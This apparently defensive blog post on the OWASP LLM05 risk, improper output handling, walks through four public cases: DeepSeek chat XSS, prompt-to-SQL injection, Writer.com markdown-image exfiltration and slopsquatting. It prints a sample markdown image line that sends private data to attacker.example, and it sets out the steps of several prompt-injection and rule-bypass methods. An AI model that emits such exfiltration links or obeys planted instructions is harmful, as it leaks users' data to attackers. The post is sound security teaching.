@@ -1,0 +1,403 @@
+---
+title: "LLM05: Improper Output Handling, with real examples"
+description: "LLM output is untrusted input. Four real cases where rendering, running or installing what a model wrote led to XSS, SQL injection and data leaks."
+date: 2026-11-02
+tags: ["owasp", "security", "llm"]
+series:
+  id: owasp-llm-top-10
+  part: 5
+---
+
+In November 2024 a security researcher uploaded a small text file to DeepSeek's
+web chat and asked the model to decode it. The reply came back as working
+JavaScript, the chat page ran it, and the script read the token that kept the
+user logged in. The model had not been hacked. The page simply trusted what the
+model wrote.
+
+That is the whole of this risk. Every team that shows model replies in a
+browser, turns them into database queries or pastes them into a terminal has
+built a pipe from the model to something that executes. **Whoever can steer the
+model's words can push input down that pipe**, and steering the words turns out
+to be easy.
+
+*Improper output handling* means passing a model's output to another
+component without the checks you would apply to any other untrusted input. The
+control that matters most is an encoder or sanitiser in code at the point where
+the output is used, because an instruction in the prompt cannot hold.
+
+This is part 5 of a series on the
+[OWASP Top 10 for LLM Applications](/blog/owasp-llm-top-10), one risk per post,
+each told through incidents that actually happened or were demonstrated in
+public.
+
+## What is improper output handling?
+
+The component receiving model output might be a web page, a SQL database, a
+shell, a file path, an email template or a package manager. Each one has its own
+way of being attacked through text it trusts.
+
+The reason it matters is that model output is not your output. A language model
+writes whatever its context pushes it towards, and that context includes the
+user's message, uploaded files, retrieved web pages and database rows. Any of
+those can contain instructions planted by someone else, which is
+[prompt injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/), the
+first item in the OWASP list and the subject of
+[part 1 of this series](/blog/owasp-llm01-prompt-injection). Improper output handling is what turns a prompt
+injection from a strange answer into a compromised system.
+
+The results look like the web bugs of the last twenty years, arriving by a new
+route:
+
+- *Cross-site scripting* (XSS), where an attacker gets a site to run their
+  script as though the site sent it. The
+  [MDN explainer](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)
+  is the clearest short account.
+- *SQL injection*, where untrusted text changes the database query an app runs.
+  OWASP's [SQL injection page](https://community.owasp.org/attacks/SQL_Injection)
+  covers the classic form.
+- *Server-side request forgery* (SSRF), where an attacker makes your server send
+  requests to places it should not reach, such as internal services. See MDN's
+  [SSRF page](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/SSRF).
+- Remote code execution, where output reaches `eval`, `exec` or a shell.
+
+It is worth separating this from misinformation, which OWASP lists as
+[LLM09](/blog/owasp-llm09-misinformation). A
+false answer is a quality problem. Improper output handling is about what the
+answer *does* to the systems that receive it, whether it is true or not.
+
+The official entry is
+[LLM05:2025 Improper Output Handling](https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/).
+
+## How do output handling attacks work?
+
+Four shapes cover most cases, and each has a real incident below.
+
+**Script in the reply.** The app renders model output as HTML or markdown. An
+attacker gets the model to emit markup such as an `iframe` or an image tag with
+an `onerror` handler, and the browser executes it on the app's own origin, with
+access to whatever that origin can see.
+
+**Model-written queries.** A chat-to-database feature asks the model to write
+SQL and runs it on the app's own connection. If that connection can delete or
+update, so can anyone who can phrase a request, or plant text the model will
+later read.
+
+**Exfiltration by rendering.** The app renders markdown images. The attacker
+makes the model output an image whose URL carries private data in its query
+string, for example:
+
+```markdown
+![loading](https://attacker.example/pixel.png?d=<private data here>)
+```
+
+The browser fetches the image to display it, and the data arrives in the
+attacker's server logs. No click is needed.
+
+**Invented dependencies.** A coding assistant suggests a package that does not
+exist. A developer runs the install command. If an attacker has registered that
+name on the public registry first, the developer installs the attacker's code.
+This variant has a name now:
+[slopsquatting](https://en.wikipedia.org/wiki/Slopsquatting), a play on
+*typosquatting*, which is registering names close to popular ones to catch
+mistakes. The dependency side of this overlaps with
+[LLM03: Supply Chain](/blog/owasp-llm03-supply-chain).
+
+In each case the model is the delivery vehicle. The damage happens downstream,
+in a component that assumed its input came from somewhere trustworthy.
+
+## Real incidents of improper output handling
+
+### DeepSeek chat: a decoded file becomes account takeover
+
+**Researcher disclosure** · disclosed November 2024
+
+**How it happened.** The researcher behind the Embrace The Red blog published
+the chain on 29 November 2024:
+
+1. Asked the DeepSeek chat to print a list of XSS payloads. One of them, an
+   `iframe`, was rendered by the page as live HTML instead of being shown as
+   text.
+2. Looked for a way a real victim might feed the model hostile content, and
+   settled on the document upload feature.
+3. Found, using browser developer tools, that a value called `userToken` in the
+   site's
+   [`localStorage`](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage)
+   (a key-value store that any script on the page can read) was all that was
+   needed to take over a session.
+4. Wrote a script that displayed that token and the page's cookies, and encoded
+   it in [Base64](https://developer.mozilla.org/en-US/docs/Glossary/Base64), a
+   way of writing bytes as plain letters and digits, so filters and the model's
+   refusals would not recognise it.
+5. Uploaded the encoded text as a file with an instruction to decode it and
+   output only the result.
+6. The model complied, the page rendered the decoded script, and it ran on the
+   chat site's origin.
+
+**Who was affected.** Users of the DeepSeek web chat at the time, if an attacker
+could get them to process a crafted document. The write-up reports no victims;
+this was a demonstration.
+
+**What was exposed.** The session token and any cookies readable by page
+scripts. The demonstration displayed them in an alert rather than sending them
+anywhere, and the author noted that adding that step would be left to the
+reader. According to the post, DeepSeek fixed the issue a day after the report,
+which went through the app's general contact form because the researcher could
+not find a security contact.
+
+**Lessons.** Model output is untrusted input to the browser, and the encoding
+trick shows why a filter on the *prompt* does not help: the dangerous text only
+exists after the model has transformed it. Encode or sanitise at the point of
+rendering, and keep session tokens where scripts cannot read them.
+
+**Source:**
+[Embrace The Red: DeepSeek AI, from prompt injection to account takeover](https://embracethered.com/blog/posts/2024/deepseek-ai-prompt-injection-to-xss-and-account-takeover/)
+
+### Prompt-to-SQL injection in LangChain chat-to-database apps
+
+**Research demonstration** · disclosed August 2023
+
+**How it happened.** Rodrigo Pedro, Daniel Castro, Paulo Carreira and Nuno
+Santos first posted their paper on 3 August 2023; a later version appeared at
+ICSE 2025. They built test apps on LangChain 0.0.189 using two components: a
+SQL chain that turns each chat question into one query, and a SQL agent that
+can run several queries in sequence.
+
+1. With no restrictions in the prompt, a chat message asking the bot to drop the
+   users table produced the destructive statement, and the app ran it. Plain
+   requests to change another user's phone number or dump a whole table also
+   worked.
+2. The researchers added prompt rules forbidding `DELETE`, `DROP` and `UPDATE`.
+   They bypassed them by showing the model a fabricated earlier exchange in
+   which the forbidden action had already succeeded, then repeating the
+   request.
+3. They limited reads in the prompt to the current user's ID. The model was
+   talked into "impersonating" another user and returned that user's data.
+4. They planted text inside a job posting stored in the database. When another
+   user asked about job postings, the injected text told the model there were
+   none. With the agent, a poisoned posting made it run an `UPDATE` that
+   changed a victim's email address and then answer the original question as if
+   nothing had happened.
+
+**Who was affected.** Developers building chat-to-database features on these
+components. The paper reports results from test apps, not a production breach.
+
+**What was exposed.** Table deletion, record changes and full table dumps
+through ordinary chat. Across seven models tested (including GPT-3.5, GPT-4,
+PaLM 2 and Llama 2), most were vulnerable to the restricted-prompt attacks.
+GPT-4 was the most resistant: one of them did not reproduce on it, and the
+others needed more elaborate prompts.
+
+**Lessons.** A rule in the prompt is not an access control. The four defences
+the authors proposed are a useful order of preference: a read-only database role
+for the bot's connection, rewriting generated queries so they can only see the
+current user's rows, preloading the user's own data into the prompt, and an
+auxiliary model that inspects results for injected instructions. They treat the
+last as partial, because the guard model can itself be injected. The database
+role is the control that holds when everything above it fails.
+
+**Source:**
+[Pedro et al., From Prompt Injections to SQL Injection Attacks (arXiv)](https://arxiv.org/abs/2308.01990)
+
+### Writer.com: a poisoned web source exfiltrates an uploaded file
+
+**Researcher disclosure** · disclosed December 2023
+
+**How it happened.** PromptArmor and Kai Greshake published this on
+15 December 2023:
+
+1. Writer.com let users generate documents from uploaded files and from web
+   pages added as sources.
+2. The researchers built a page with instructions hidden in small white text,
+   invisible to a person reading it.
+3. A user uploaded a sensitive file, added the page as a source and asked for a
+   report.
+4. The model followed the hidden instructions instead of the user's request. It
+   output a markdown image whose URL carried the uploaded file's contents as
+   query parameters.
+5. The app rendered the image. The browser requested the URL, and the data
+   landed in the attacker's server logs.
+
+The post also notes that the site's
+[Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP)
+(a header telling the browser which domains a page may load from) allowed
+`*.cloudfront.net`, a widely used hosting domain anyone can serve content from.
+
+**Who was affected.** Writer.com users who added untrusted pages as sources.
+According to the researchers, paid accounts had the same exposure. The
+demonstration used mock data.
+
+**What was exposed.** In the main demo, a test file with mock social security
+numbers, revenue and salary figures was sent out in full. Further examples
+leaked a confidential file and chat history through links. The researchers
+reported the issue on 29 November. According to the post, Writer replied on
+5 December that it did not consider it a security issue because real customer
+accounts did not have website access. By 19 December, markdown images and
+clickable links no longer rendered.
+
+**Lessons.** Rendering is an outbound channel. An image tag in model output is
+a network request the attacker gets to address. Strip or proxy external images
+and links in model replies, keep image sources in the CSP to domains you control,
+and triage prompt-injection reports as security reports even when no code is
+broken.
+
+**Source:**
+[PromptArmor and Kai Greshake: Data exfiltration from Writer.com](https://promptarmor.substack.com/p/data-exfiltration-from-writercom)
+
+### huggingface-cli: a hallucinated package gets 30,000 installs
+
+**Research demonstration** · disclosed March 2024
+
+**How it happened.** Bar Lanyado of Lasso Security published the study on
+28 March 2024:
+
+1. He collected 47,803 "how to" coding questions across Python, Node.js, Go,
+   .NET and Ruby, and put them to GPT-3.5-Turbo, GPT-4, Gemini Pro and Cohere's
+   Coral.
+2. A large share of answers recommended packages that did not exist: from
+   about 22% to 64.5% depending on the model.
+3. To test whether the inventions were predictable, he took 20 questions that
+   had produced a hallucination and asked each one 100 times per model. A
+   meaningful fraction of the invented names came back repeatedly.
+4. One recurring invention was a Python package called `huggingface-cli`. He
+   uploaded an empty package under that name to the public index, plus a
+   meaningless control package to estimate how many downloads came from
+   automated scanners.
+5. Real installs followed.
+
+**Who was affected.** Developers who ran install commands from generated
+answers. A GitHub search found the package in the install instructions of a
+research repository attributed to Alibaba, according to the write-up.
+
+**What was exposed.** Nothing malicious, because the package was empty. It
+received more than 30,000 authentic downloads in about three months, according
+to the researcher. An attacker doing the same could have shipped code to every
+one of those machines.
+
+**Lessons.** A confident model answer is not evidence that a dependency exists.
+Package registries become part of your attack surface the moment generated
+code is installed without review. Check that a suggested package exists, is
+maintained and is the one you meant, and use lockfiles so new names cannot slip
+in unnoticed.
+
+**Source:**
+[Lasso Security: Diving into AI package hallucinations](https://www.lasso.security/blog/ai-package-hallucinations)
+
+## How should a small team handle model output?
+
+None of these removes the risk. Each narrows what a steered model can do once
+its output leaves the model. Most are ordinary web security applied to a new
+source of input.
+
+1. **Treat every model reply as user input.** Whatever validation and encoding
+   you would apply to a form field, apply to the model's output before it
+   reaches a browser, a query or a command. The model sits on the untrusted side
+   of the boundary.
+
+2. **Encode for the destination.** HTML-escape text going into a page, use
+   parameters for SQL, quote arguments for a shell, and pick the encoding by
+   context. The
+   [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+   lists which encoding fits which context.
+
+3. **Render markdown through an allowlist.** If replies must show formatting,
+   convert markdown to HTML with raw HTML disabled, then pass the result through
+   a sanitiser such as
+   [DOMPurify](https://github.com/cure53/DOMPurify). Avoid inserting model
+   output with `innerHTML` or React's `dangerouslySetInnerHTML` without that
+   step.
+
+4. **Decide whether replies need images and links at all.** If they do not,
+   strip them. If they do, restrict image sources to your own domains or route
+   them through a proxy that drops query strings. This one decision closes the
+   Writer.com channel.
+
+5. **Set a strict Content Security Policy.** Limit `script-src` and `img-src`
+   to origins you control and avoid wildcard hosting domains. A CSP will not stop
+   the model writing a payload, but it narrows where an injected script can load
+   from or send data to.
+
+6. **Keep session tokens out of script reach.** Store sessions in cookies with
+   the `HttpOnly` attribute, which hides them from JavaScript, as MDN's
+   [cookie guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies)
+   explains, rather than in `localStorage`. An XSS bug then has less to steal.
+
+7. **Give chat-to-SQL a read-only role.** Connect with a database user granted
+   only `SELECT` on the tables the feature needs, and scope rows to the current
+   user in the database or in a query wrapper, not in the prompt. Where the
+   model only fills in values, use
+   [parameterised queries](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html)
+   so its text is never parsed as SQL.
+   [Read-only by default](/blog/read-only-mcp-servers) walks through the same
+   idea for an MCP server pointed at a real database: a text filter that is
+   allowed to be imperfect, and a read-only transaction that refuses writes
+   regardless.
+
+8. **Never pass model output to `eval`, `exec` or a shell.** If a feature needs
+   the model to trigger actions, have it choose from a fixed set of functions
+   with validated arguments rather than writing commands.
+
+9. **Check generated dependencies before installing.** Confirm the package
+   exists, has history and is the one the documentation names. Commit lockfiles
+   such as npm's
+   [`package-lock.json`](https://docs.npmjs.com/cli/v10/configuring-npm/package-lock-json)
+   so a new name shows up in review rather than in production.
+
+10. **Log what the model emits.** Keep a record of outputs that reached a
+    renderer, a query or a tool, and alert on markup, unexpected URLs or SQL
+    keywords where none belong. When something goes wrong, the output log is the
+    evidence.
+
+The common thread is where the check sits. A system prompt that says *never
+output HTML* is a request. **An encoder at the rendering step is a control.**
+
+If you want to know where your own model output lands unchecked, I
+[review every place a reply is rendered, run or installed](/contact).
+
+## FAQ
+
+**Can an LLM's reply cause cross-site scripting?** Yes, if the page renders it
+as HTML. In November 2024 a researcher got DeepSeek's chat to output a script
+that ran on the chat site and read the user's session token, according to the
+[Embrace The Red write-up](https://embracethered.com/blog/posts/2024/deepseek-ai-prompt-injection-to-xss-and-account-takeover/),
+which says DeepSeek fixed it a day after the report.
+
+**Can a prompt rule stop a chat-to-SQL bot from deleting data?** No. Pedro et al.
+[bypassed](https://arxiv.org/abs/2308.01990) prompt rules forbidding `DELETE`,
+`DROP` and `UPDATE` by showing the model a fabricated earlier exchange. A
+database role with only `SELECT` is the control that holds.
+
+**Why are markdown images in chatbot replies a risk?** The browser fetches an
+image URL without a click, so a URL carrying private data sends it to whoever
+owns the server. That is how the
+[Writer.com demonstration](https://promptarmor.substack.com/p/data-exfiltration-from-writercom)
+of December 2023 exfiltrated an uploaded file.
+
+**What is slopsquatting?** Registering a package name that coding assistants
+invent, so developers who trust the suggestion install the attacker's code. In
+[Lasso Security's study](https://www.lasso.security/blog/ai-package-hallucinations),
+an empty package named after one such invention received more than 30,000
+authentic downloads in about three months.
+
+## References
+
+- OWASP: [LLM05:2025 Improper Output Handling](https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/)
+- OWASP: [LLM01:2025 Prompt Injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)
+- Embrace The Red: [DeepSeek AI, from prompt injection to account takeover](https://embracethered.com/blog/posts/2024/deepseek-ai-prompt-injection-to-xss-and-account-takeover/)
+- Pedro, Castro, Carreira and Santos: [From Prompt Injections to SQL Injection Attacks: How Protected is Your LLM-Integrated Web Application?](https://arxiv.org/abs/2308.01990)
+- PromptArmor and Kai Greshake: [Data exfiltration from Writer.com with indirect prompt injection](https://promptarmor.substack.com/p/data-exfiltration-from-writercom)
+- Lasso Security: [Diving into AI package hallucinations](https://www.lasso.security/blog/ai-package-hallucinations)
+- MDN: [Cross-site scripting (XSS)](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)
+- OWASP: [SQL Injection](https://community.owasp.org/attacks/SQL_Injection)
+- MDN: [Server Side Request Forgery (SSRF)](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/SSRF)
+- MDN: [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP)
+- MDN: [Using HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies)
+- MDN: [Window: localStorage property](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage)
+- MDN: [Base64](https://developer.mozilla.org/en-US/docs/Glossary/Base64)
+- OWASP Cheat Sheet Series: [Cross Site Scripting Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- OWASP Cheat Sheet Series: [Query Parameterization](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html)
+- cure53: [DOMPurify](https://github.com/cure53/DOMPurify)
+- npm Docs: [package-lock.json](https://docs.npmjs.com/cli/v10/configuring-npm/package-lock-json)
+- Wikipedia: [Slopsquatting](https://en.wikipedia.org/wiki/Slopsquatting)
+- Series hub: [OWASP Top 10 for LLM Applications, explained](/blog/owasp-llm-top-10)
+
+Based on the [OWASP Top 10 for LLM Applications 2025](https://genai.owasp.org/llm-top-10/) ([CC BY-SA 4.0](https://creativecommons.org/licenses/by-sa/4.0/)). Independent commentary, not endorsed by OWASP.
